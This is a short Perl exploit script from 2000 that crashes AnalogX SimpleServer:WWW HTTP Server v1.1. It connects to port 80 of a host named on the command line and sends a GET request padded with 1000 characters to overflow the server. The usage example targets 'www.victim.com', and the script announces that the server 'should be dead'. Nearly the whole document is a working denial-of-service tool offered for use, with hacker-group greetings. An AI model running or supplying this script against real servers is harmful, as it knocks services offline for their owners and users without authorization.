   #!/usr/bin/perl
   #
   # Buffer Overflow exploit for AnalogX SimpleServer:WWW HTTP Server v1.1
   # ---------------------------------------------------------------------
   #
   # Exploit Coded By : Neon-Lenz (neonlenz@nightmail.com)
   #
   # Website: http://TheGovernment.Com/Cyrax
   #
   # Usage: ./AnalogX.pl <host>
   #
   # Example: ./AnalogX.pl www.victim.com
   #
   # Greets To: Acid Blades, ThePike, Trib, Kn00p, KeyDet, DarkHunter and
   # everyone else i forgot to mention !

   use IO::Socket;

   $host=$ARGV[0];
   $port=80;

   print <<"EOT";

   AnalogX SimpleServer:WWW HTTP Server v1.1 Buffer Overflow By Neon-Lenz
   ----------------------------------------------------------------------
   Usage: ./AnalogX.pl <host> (assign a webserver, or it won't work)

   Example: ./AnalogX.pl www.victim.com

   EOT

   $sock = IO::Socket::INET->new(PeerAddr => $host,      # Connects to the host
                                 PeerPort => $port,
                                 Proto    => 'tcp');

   $z=Z;

   $send = $z x 1000;                                    # Overflows the host
           print "GET 1000 chars on remote webserver.\n";
           print $sock "GET /$send\n";
           sleep(3);
           print "Done. AnalogX server should be dead.\n";


   close($sock) # Hmm closes the stuff, duh!

   #EOC - End Of Code
   #                   www.hack.co.za   [4 September 2000]#
